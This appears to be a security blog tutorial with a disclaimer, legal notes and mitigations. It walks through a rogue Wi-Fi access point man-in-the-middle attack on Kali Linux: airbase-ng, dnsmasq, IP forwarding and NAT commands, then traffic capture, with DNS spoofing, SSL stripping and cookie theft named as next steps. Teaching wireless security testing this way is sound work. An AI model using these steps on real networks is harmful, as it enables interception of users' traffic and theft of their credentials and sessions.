Understanding and Executing Man-in-the-Middle Attacks with Rogue Access Points
By [Your Name], Security Researcher
Man-in-the-Middle (MITM) attacks are a significant threat in wireless networks, allowing attackers to intercept and manipulate communication between clients and access points (APs). One potent method involves creating a rogue access point—a malicious Wi-Fi network designed to lure unsuspecting users. This blog provides a detailed, practical guide to understanding and executing a rogue AP-based MITM attack, aimed at both beginners and advanced security enthusiasts. We’ll focus on using Kali Linux and tools like airbase-ng to demonstrate the attack, while emphasizing ethical considerations and legal boundaries.

Disclaimer: This guide is for educational purposes only. Performing MITM attacks on networks or devices without explicit permission is illegal and unethical. Always conduct security research in controlled, authorized environments.

What is a Rogue Access Point MITM Attack?
A rogue access point is a malicious Wi-Fi network set up by an attacker to mimic a legitimate AP. By enticing users to connect, the attacker can intercept traffic, modify data, or launch further attacks like phishing or session hijacking. This technique is particularly effective in public Wi-Fi environments, where users may not verify the authenticity of networks.
MITM attacks via rogue APs exploit the trust users place in Wi-Fi networks. Other related techniques include ARP spoofing, Evil Twin attacks, Wi-Fi Pineapple, and DNS spoofing, each with unique mechanisms for intercepting traffic. This blog focuses on the rogue AP method, as it’s accessible yet powerful for demonstrating MITM concepts.
Prerequisites
To follow this guide, you’ll need:

A Kali Linux machine (physical or virtual).
An external Wi-Fi adapter (e.g., TP-Link WN722N) that supports monitor mode.
Basic familiarity with Linux terminal commands.
Tools from the Aircrack-ng suite (airbase-ng, airodump-ng, etc.).
A controlled lab environment with explicit permission to test.

Step-by-Step Guide to Creating a Rogue AP for MITM
Step 1: Set Up Your Wi-Fi Adapter in Monitor Mode
To capture and manipulate wireless traffic, your Wi-Fi adapter must be in monitor mode, which allows it to listen to all wireless packets, not just those destined for your device.

Connect your external Wi-Fi adapter (e.g., TP-Link WN722N) to your Kali Linux machine.
Verify the adapter is recognized:iwconfig

Look for your adapter’s interface name (e.g., wlan0).
Enable monitor mode:sudo airmon-ng start wlan0

This creates a new interface (e.g., wlan0mon). Confirm with iwconfig.

Step 2: Create the Rogue Access Point
Using airbase-ng from the Aircrack-ng suite, we’ll create a rogue AP with a customized SSID to mimic a legitimate network.

Launch the rogue AP:
sudo airbase-ng -e "FreeWiFi" -c 6 -P wlan0mon


-e "FreeWiFi": Sets the SSID to “FreeWiFi” (choose a name that blends with the environment).
-c 6: Specifies the channel (e.g., channel 6; match the target AP’s channel for realism).
-P: Enables the AP to respond to all probe requests, increasing the likelihood of client connections.
wlan0mon: The monitor-mode interface.

This command creates a virtual AP interface (e.g., at0).

Monitor the AP activity in the terminal. You’ll see clients attempting to connect, as shown in Figure 7.26 (conceptual representation of the rogue AP setup).


Step 3: Configure Network Routing
To intercept traffic, you need to route client traffic through your Kali machine.

Enable IP forwarding:
sudo sysctl -w net.ipv4.ip_forward=1


Set up the virtual AP interface (at0) with an IP address:
sudo ifconfig at0 up 192.168.1.1 netmask 255.255.255.0


Configure a DHCP server to assign IP addresses to connecting clients. Install and configure dnsmasq:
sudo apt-get install dnsmasq

Create a configuration file (/etc/dnsmasq.conf):
interface=at0
dhcp-range=192.168.1.2,192.168.1.100,12h

Start dnsmasq:
sudo dnsmasq -C /etc/dnsmasq.conf


Set up NAT to allow clients internet access (optional, to make the rogue AP convincing):
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE



Step 4: Intercept and Analyze Traffic
Once clients connect to your rogue AP (as depicted in Figure 7.27), their traffic routes through your Kali machine. Use tools like Wireshark or tcpdump to capture and analyze packets.

Start Wireshark:
sudo wireshark &

Select the at0 interface and filter for protocols like HTTP, DNS, or TLS to inspect traffic.

For advanced attacks, you can:

DNS Spoofing: Redirect clients to malicious sites by altering DNS responses (use tools like dnsspoof).
SSL Stripping: Downgrade HTTPS connections to HTTP (use sslstrip).
Session Hijacking: Steal cookies or tokens using tools like ettercap.



Step 5: Clean Up
After testing, dismantle the rogue AP and restore your system:

Stop airbase-ng (Ctrl+C in the terminal).
Disable monitor mode:sudo airmon-ng stop wlan0mon


Stop dnsmasq and reset IP forwarding:sudo killall dnsmasq
sudo sysctl -w net.ipv4.ip_forward=0



Ethical and Legal Considerations

Permission is Mandatory: Conducting MITM attacks without explicit consent is illegal under laws like the U.S. Computer Fraud and Abuse Act or the UK Computer Misuse Act.
Controlled Environment: Test only in lab settings or on networks you own or have permission to analyze.
Responsible Disclosure: If you identify vulnerabilities during authorized testing, report them to the network owner following responsible disclosure practices.

Advanced Techniques and Mitigations
Related MITM Techniques

Evil Twin Attack: A variant where the rogue AP mimics a specific legitimate AP, often combined with de-authentication attacks to force clients to connect.
Wi-Fi Pineapple: A hardware device that automates rogue AP and MITM attacks.
ARP Spoofing: Manipulates ARP tables to intercept traffic on wired or wireless networks.
DNS Spoofing: Redirects DNS queries to malicious servers.

Mitigations
To protect against rogue AP attacks:

Use VPNs: Encrypt traffic to prevent interception.
Verify SSIDs: Avoid connecting to unverified or suspiciously named networks.
Enable WPA3: Modern encryption protocols make rogue APs harder to exploit.
Monitor Network Activity: Use intrusion detection systems to spot unauthorized APs.

Conclusion
Rogue access point-based MITM attacks are a powerful demonstration of wireless network vulnerabilities. By setting up a rogue AP with tools like airbase-ng, security researchers can study how attackers intercept and manipulate traffic. However, this knowledge must be used responsibly, within legal and ethical boundaries. For beginners, mastering these steps builds a foundation in wireless security testing, while advanced users can explore related techniques like DNS spoofing or session hijacking to deepen their expertise.
Stay curious, stay ethical, and keep securing the digital world.
